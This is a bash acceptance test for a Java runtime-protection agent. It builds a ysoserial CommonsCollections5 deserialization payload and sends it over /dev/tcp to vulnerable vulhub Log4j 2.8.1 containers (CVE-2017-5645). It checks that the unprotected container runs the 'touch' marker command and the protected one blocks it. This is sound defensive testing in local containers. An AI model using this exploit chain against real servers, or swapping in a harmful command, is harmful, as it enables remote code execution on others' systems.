#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_LOG4J_5645_IMAGE:-vulhub/log4j:2.8.1}"
baseline_name="${OHMYRASP_VULHUB_LOG4J_5645_BASELINE_NAME:-ohmyrasp-vulhub-log4j5645-baseline}"
protected_name="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_NAME:-ohmyrasp-vulhub-log4j5645-protected}"
baseline_port="${OHMYRASP_VULHUB_LOG4J_5645_BASELINE_PORT:-19172}"
protected_port="${OHMYRASP_VULHUB_LOG4J_5645_PROTECTED_PORT:-19173}"
payload_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
payload_file="${payload_dir}/log4j-5645-cc5-touch.ser"
success_file="/tmp/ohmyrasp-log4j5645-success"
baseline_dir="logs/vulhub-log4j-2017-5645-java8-baseline"
protected_dir="logs/vulhub-log4j-2017-5645-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

prepare_payload() {
  mkdir -p "$payload_dir"
  if [[ ! -s "${payload_dir}/ysoserial.jar" ]]; then
    rm -rf "${payload_dir}/src"
    docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
  docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
    bash -lc '/usr/local/openjdk-8/bin/java -jar ysoserial.jar CommonsCollections5 "touch /tmp/ohmyrasp-log4j5645-success" > /work/log4j-5645-cc5-touch.ser && test -s /work/log4j-5645-cc5-touch.ser'
}

wait_for_tcp_server() {
  local name="$1"
  local port="$2"
  local dir="$3"

  for attempt in $(seq 1 60); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
      printf 'tcp_ready_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose Log4j TCP SocketServer on ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  echo "missing Java8 agent startup event for Log4j CVE-2017-5645" >&2
  exit 1
}

send_payload() {
  local port="$1"
  local dir="$2"
  if cat "$payload_file" > "/dev/tcp/127.0.0.1/${port}"; then
    printf 'payload_send_status=ok\n' >> "${dir}/attempts.log"
  else
    printf 'payload_send_status=connection_closed\n' >> "${dir}/attempts.log"
  fi
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:4712" \
    "$image" >/dev/null
  wait_for_tcp_server "$baseline_name" "$baseline_port" "$baseline_dir"
}

start_protected() {
  docker run -d --name "$protected_name" \
    -p "${protected_port}:4712" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null
  wait_for_tcp_server "$protected_name" "$protected_port" "$protected_dir"
  wait_for_protected_startup
}

run_baseline() {
  start_baseline
  docker exec "$baseline_name" rm -f "$success_file"
  send_payload "$baseline_port" "$baseline_dir"

  for attempt in $(seq 1 10); do
    if docker exec "$baseline_name" test -e "$success_file"; then
      printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      copy_artifacts "$baseline_name" "$baseline_dir"
      docker rm -f "$baseline_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done

  docker logs "$baseline_name" >&2 || true
  echo "baseline Log4j CVE-2017-5645 did not execute the CommonsCollections5 payload" >&2
  exit 1
}

run_protected() {
  start_protected
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Log4j container produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  send_payload "$protected_port" "$protected_dir"
  sleep 2

  if docker exec "$protected_name" test -e "$success_file"; then
    echo "protected Log4j CVE-2017-5645 created ${success_file} despite Java8 RASP" >&2
    exit 1
  fi
  if ! grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    echo "missing java8_deserialization_gadget_class block event for Log4j CVE-2017-5645" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_payload
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Log4j CVE-2017-5645 Java8 acceptance passed"
